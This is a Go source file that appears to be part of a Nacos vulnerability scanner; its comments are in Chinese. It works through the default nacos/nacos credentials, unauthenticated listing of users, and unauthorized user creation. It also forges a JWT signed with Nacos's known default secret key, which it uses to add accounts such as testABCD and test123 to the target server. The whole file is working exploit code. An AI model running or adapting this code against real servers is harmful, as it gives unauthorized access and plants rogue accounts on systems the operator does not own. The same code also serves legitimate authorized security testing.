package utils

import (
	"github.com/golang-jwt/jwt/v4"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func Checkvul(url string) []string {
	var res []string
	// 默认口令nacos
	vulpath1 := "/nacos/v1/auth/users/login"
	// 未授权访问漏洞
	vulpath2 := "/nacos/v1/auth/users?pageNo=1&pageSize=5"
	// 任意用户添加漏洞
	vulpath3 := "/nacos/v1/auth/users"
	// 默认JWT任意用户添加漏洞
	vulpath4 := "/nacos/v1/auth/users?accessToken=" + GenJWT()

	nacosData := "username=nacos&password=nacos"
	userData1 := "username=testABCD&password=testABCD"
	userData2 := "username=test123&password=test123"

	responseV1, _ := http.Post(url+vulpath1, "application/x-www-form-urlencoded", strings.NewReader(nacosData))
	if responseV1.StatusCode == 200 {
		res = append(res, "\n[+]"+url+"存在默认口令nacos/nacos")
	}

	responseV2, _ := http.Get(url + vulpath2)
	str_byteV2, _ := ioutil.ReadAll(responseV2.Body)
	if strings.Contains(string(str_byteV2), "username") {
		res = append(res, "\n[+]"+url+vulpath2+"存在未授权访问漏洞")
	}

	responseV3, _ := http.Post(url+vulpath3, "application/x-www-form-urlencoded", strings.NewReader(userData1))
	str_byteV3, _ := ioutil.ReadAll(responseV3.Body)
	if strings.Contains(string(str_byteV3), "create user ok") {
		res = append(res, "\n[+]"+url+"存在任意用户添加漏洞 添加用户testABCD/testABCD")
	}

	responseV4, _ := http.Post(url+vulpath4, "application/x-www-form-urlencoded", strings.NewReader(userData2))
	str_byteV4, _ := ioutil.ReadAll(responseV4.Body)
	if strings.Contains(string(str_byteV4), "create user ok") {
		res = append(res, "\n[+]"+url+"存在默认JWT漏洞 添加用户test123/test123")
	}

	return res
}

type MyClaims struct {
	jwt.RegisteredClaims
}

var Secret = []byte("SecretKey012345678901234567890123456789012345678901234567890123456789")

func GenJWT() string {
	claim := MyClaims{
		RegisteredClaims: jwt.RegisteredClaims{
			Subject:   "nacos",
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(3 * time.Hour * time.Duration(1))), // 过期时间3小时
		}}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claim)
	tokenString, _ := token.SignedString(Secret)
	return tokenString
}
